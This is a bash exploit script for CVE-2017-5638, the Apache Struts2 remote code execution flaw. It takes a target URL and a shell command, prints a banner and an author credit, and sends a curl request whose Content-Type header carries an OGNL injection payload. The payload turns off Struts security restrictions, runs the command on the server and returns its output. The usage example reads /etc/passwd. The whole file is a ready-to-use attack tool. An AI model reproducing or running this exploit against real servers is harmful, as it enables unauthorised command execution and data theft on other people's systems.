#!/bin/bash

if [ $# -lt 2 ]
then
	echo -e "\e[1;36m	
	[+] Usage: ./${0##*/} <url> <cmd>
	[+] Example: ./${0##*/} http://localhost:8080/struts2/fileupload/doUpload.action 'cat /etc/passwd'
\e[0m"
	exit 1
else
url=$1 
cmd=$2
host=`gawk -F/ '{print $3}' <<<$url`
clear
echo -e "\e[1;32m\n\n	888b     d888          888       888 d8b          
	8888b   d8888          888   o   888 Y8P          
	88888b.d88888          888  d8b  888              
	888Y88888P888 888d888  888 d888b 888 888 88888b.  
	888 Y888P 888 888P\"    888d88888b888 888 888 \"88b 
	888  Y8P  888 888      88888P Y88888 888 888  888 
	888   \"   888 888  d8b 8888P   Y8888 888 888  888 
	888       888 888  Y8P 888P     Y888 888 888  888 
                                                  
                                                  
                                                  \e[0m"


echo -e "\e[1;36m	[+] Designed By Bipin Jitiya
	[+] CVE: 2017-5638 - Apache Struts2 RCE
	[+] Target: $url
	[+] Command: $cmd


\e[0m"
# CVE: 2017-5638 Payload
x="curl -i -s -k  -X $'POST' \
    -H $'Host: $host' -H $'Content-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'$cmd\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} ' \
    $'$url'"
	eval $x
	echo -e "\n"

fi

